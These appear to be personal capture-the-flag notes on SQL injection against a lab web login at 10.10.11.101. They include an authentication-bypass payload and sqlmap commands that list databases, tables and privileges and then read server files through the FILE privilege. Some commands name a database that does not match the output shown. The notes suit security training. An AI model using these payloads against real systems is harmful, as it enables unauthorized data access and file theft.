## database 
good article for sqlmap https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
## actually it was sql injection
```bash
admin'  or 1=1 or ''='
```
## show databases
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --dbs --batch
```

```bash
available databases [2]:
[*] information_schema
[*] writer

```
## show tables of particular database
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --tables -D safecosmetics
```

```bash
Database: writer
[3 tables]
+---------+
| site    |
| stories |
| users   |
	+---------+

```
## show columns of table
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --columns -D safecosmetics -T users
```

## show current user
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST  --batch --current-user
```

## privilegies
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST  --batch  --privileges
```

```bash
database management system users privileges:
[*] %admin% [1]:
    privilege: FILE

```
## file read
```bash
$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --batch --file-read /
```